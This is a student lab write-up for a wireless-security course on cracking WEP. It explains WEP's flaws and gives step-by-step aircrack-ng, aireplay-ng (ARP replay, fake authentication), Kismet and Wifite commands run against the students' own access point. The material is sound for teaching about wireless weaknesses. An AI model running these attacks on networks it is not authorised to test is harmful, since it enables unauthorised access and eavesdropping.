![logo uit](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/uit-logo.png)

# Project : Cracking WEP

Student 1: **17520771** – Lê Thị Huyền My

Student 2: **17521104** – Lê Thị Huyền Thư

Class: NT330.K21.**ANTN**

Lecturer: Lê Kim Hùng

Courses: Wireless Security

[I.Introduce](#i-introduce)

1. [Wired Equivalent Privacy](#1-wired-equivalent-privacy-wep)

2. [WEP Issues](#2-wep-issues)

[II.Hardware](#ii-hardware)

[III.Cracking WEP](#iii-cracking-wep)

1. [Aircrack-ng](#1-aircrack-ng)

    - [Step 1: Set up wifi modem (low password)](#step-1-set-up-wifi-modem-low-password)

    - [Step 2: Run monitor mode](#step-2-run-monitor-mode)

    - [Step 3: Capture wireless packet](#step-3-capture-wireless-packet)

    - [Step 4: Cracking WEP](#step-4-cracking-wep)

    - [Step 5: Set up wifi modem (advance password)](#step-5-set-up-wifi-modem-advance-password)
  
2. [Kismet](#2-kismet)

3. [Wifite](#3-wifite) 

# I. Introduce

## 1. Wired Equivalent Privacy (WEP)

- WEP is an IEEE 802.11 wireless protocol which provides security algorithms for data confidentiality during wireless transmissions
- WEP uses 24-bit initalization vector (IV) to form stream cipher RC4 for confidentiality and the CRC-32 checksum for intergrity of wireless transmission.

## 2. WEP Issues

- The IV is a 24-bit field which is too small and is sent in the cleartext portion of a message
- Identical key streams are produced with the reuse of the same IP for data protection, as the IV is short key streams are repeated within short time
- Lack of centralized key management makes it difficult to change the WEP keys with any regularity
- When there is IV collision, it becomes possible to reconstruct the RC4 keystream based in the IV and the decrypted payload of the packet
- IV is a part of the RC4 encryption key, leads to a analytical attack that recovers the key after intercepting and analyzing a relatively small amount of traffic
- Use of RC4 was designed to be a one-time cipher and not intended for multiples message use
- No defined method for encryption key distribution
- Wirless adapters from the same vendor may all generate the same IV sequence. This enables attackers to determine the key stream and decrypt the ciphertext
- WEP does not provide cryptographic integrity protection. By capturing two packets an attacker can flip a bit in the encrypted stream and modify the checksum so that the paket is accepted
- WEP is based on a password, prone to password cracking attacks
- An attacker can construct a decryption table of the reconstructed key stream and can use it to decrypt the WEP packets in real-time

# II. Hardware

- OS: Kali Linux 2020.1b amb64 in VMware Workstation 15
- AP: Tp-link TL-WN722N (installed drive Rtl8188eus)
- Core: 4 core
- RAM: 2GB
- SCSI: 80GB

# III. Cracking WEP

## 1. Aircrack-ng

### Step 1: Set up wifi modem (low password)

SSID: LETHIHUYEN \*; 128-bit key; low password: 1234567890123

![set up AP with low password](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/set-up-AP-low-pass.png)

### Step 2: Run monitor mode

> #iw dev wlan0 set type monitor
>
> #airmon-ng start wlan0

Use the *iwconfig* command to check

![start mode monitor](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/start-mode-monitor.png)

### Step 3: Capture wireless packet

> #airodump-ng wlan0

Airodump-ng provides basic information of AP such as: BSSID, beacons, data, channel, max speed, encryption algorithm, cipher detected, authentication protocol, ESSID

![ariodump-ng collect base information](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/airodump-ng-collect-information.png)

We need lock the wireless card on the same channel as the AP with the following command: 
> #iwconfig wlan0mon channel 1

The basic injection test provides additional valuable information as well

> #aireplay-ng -9 -e LETHIHUYEN\* -a 72:F4:C2:D1:75:08 wlan0
>
>> -9 means injection test
>>
>> -e LETHIHUYEN\* is the network name (SSID)
>>
>> -a 72:F4:C2:D1:75:08 is MAC address of the access point (BSSID)
>>
>> -wlan0 is the interface name

![injection test](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/injection-test.png)

Capture wireless packet:

> #airodump-ng –bssid 72:F4:C2:D1:75:08 -c 1 -w WEPcrack wlan0
>
>> --bssid is MAC address of the access point
>>
>> -c 1 is AP channel
>>
>> -w WEPcrack: export to WEP crack file

![capture packet](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/capture-file-wepcrack.png)

Generate traffic:

> #aireplay-ng -3 -b 72:F4:C2:D1:75:08 -h E0:62:67:49:0D:74 wlan0
>
>> -3 means standard arp request replay
>>
>> -b 72:F4:C2:D1:75:08 is the access point MAC address
>>
>> -h E0:62:67:49:0D:74 is the source MAC address

![generate traffic](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/generate-traffic-1.png)

> #aireplay-ng -1 0 -e LETHIHUYEN\* -a 72:F4:C2:D1:75:08 -h E0:62:67:49:0D:7A wlan0
>
>> -1 means fake authentication
>>
>> 0 reassociation timing in seconds

![generate traffic](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/generate-traffic-2.png)

### Step 4: Cracking WEP

Use the command #aircrack-ng WEPcrack-01.cap to analyze IVs in the file WEPcrack-01.cap. Aircrack-ng can recover the WEP key once enough encrypted packets have been captured.

> Password: 1234567890123

![find low password in WEPcrack](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/find-low-pass.png)

### Step 5: Set up wifi modem (advance password)

Password: LTH\*=.=@uit10

![set up AP with advance passwork](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/set-up-AP-advance-pass.png)

The number of IVs collected is not enough for analysis, there will be a failure message showing the number of IVs needed.

![fail to find password](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/fail-to-get-pass.png)

We got the password

![find advance password](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/find-advance-pass.png)


2. Kismet

Kismet uses wireless network card set in monitor mode to scan all Wi-fi channels in the surrounding area. Kismet visualizes networks in the surrounding area, the operation of devices connected to the networks in that area.

> kismet -c wlan0

We can access the Kismet GUI by following the link *http://127.0.0.1:2501*

Kismet can collect some information such as: Name, BSSID, MAC address, device type, frequency, channel, clients, crypto ...

![Kismet GUI](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/kissmet.png)

We can get more information of AP by clicking and read the information in the "Device Info"

3. [Wifite]

Wifite is an automated wireless attack tool for *Linux only*. 

Features:

- Sorts targets by signal strength (in dB); cracks closest access points first
- Automatically de-authenticates clients of hidden networks to reveal SSIDs
- Numerous filters to specify exactly what to attack (wep/wpa/both, above certain signal strengths, channels, etc)
- Customizable settings (timeouts, packets/sec, etc)
“anonymous” feature; changes MAC to a random address before attacking, then changes back when attacks are complete
- All captured WPA handshakes are backed up to wifite.py’s current directory
- Smart WPA de-authentication; cycles between all clients and broadcast deauths
- Stop any attack with Ctrl+C, with options to continue, move onto next target, skip to cracking, or exit
- Displays session summary at exit; shows any cracked keys
- All passwords saved to cracked.txt

![wifite](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/wifite.png)

Select target:

![select target](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/select-target_wifite.png)

There are many attack options:

![options wifite](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/options_wifite.PNG)

The password saved to cracked.txt: 123456789

![low pass wifite](https://raw.githubusercontent.com/Huy3nMy/Cracking_WEP/master/image/low_pass_wifite.png)
